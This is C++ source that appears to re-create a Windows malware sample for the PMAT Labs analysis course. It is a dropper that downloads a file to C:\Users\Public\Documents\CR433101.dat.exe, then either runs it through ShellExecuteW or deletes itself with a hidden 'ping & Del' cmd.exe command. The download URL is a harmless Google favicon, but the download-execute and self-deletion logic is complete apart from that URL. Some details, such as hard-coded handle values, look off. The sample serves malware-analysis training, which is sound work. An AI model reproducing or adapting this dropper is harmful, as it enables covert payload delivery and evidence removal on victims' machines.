/*
PMAT Labs: https://www.virustotal.com/gui/file/92730427321a1c4ccfc0d0580834daef98121efa9bb8963da332bfd6cf1fda8a
*/
#include <iostream>
#include <Windows.h>
#include <wininet.h>

#pragma warning( disable : 6230 )
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")

int main(void)
{
    HINTERNET hInternet = nullptr;
    PROCESS_INFORMATION pi;
    STARTUPINFOW si;
    WCHAR FileName[MAX_PATH + 1] = L"\0";
    WCHAR CommandLine[MAX_PATH * 2 + 2];

    hInternet = InternetOpenW(L"Mozilla/5.0", 0, NULL, NULL, 0);

    pi.hProcess = reinterpret_cast<HANDLE>(2000);
    pi.hThread = 0;
    if (URLDownloadToFileW(NULL, L"https://www.google.com/favicon.ico", L"C:\\Users\\Public\\Documents\\CR433101.dat.exe", 0, NULL))
    {
        memset(&si, 0, sizeof(si));
        GetModuleFileNameW(NULL, FileName, MAX_PATH);
        _snwprintf_s(CommandLine, 520, L"cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"", FileName);
        CreateProcessW(NULL, CommandLine, 0, 0, TRUE, CREATE_NO_WINDOW, nullptr, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    else
    {
        InternetOpenUrlW(hInternet, L"http://www.google.com", 0, 0, INTERNET_FLAG_RAW_DATA, 0);
        pi.hProcess = reinterpret_cast<HANDLE>(200);
        pi.hThread = 0;
        ShellExecuteW(
            NULL,
            L"open",
            L"ping 1.1.1.1 -n 1 -w 3000 > Nul & C:\\Users\\Public\\Documents\\CR433101.dat.exe",
            NULL,
            NULL,
            SW_SHOWNORMAL
        );
        return 0;
    }
}
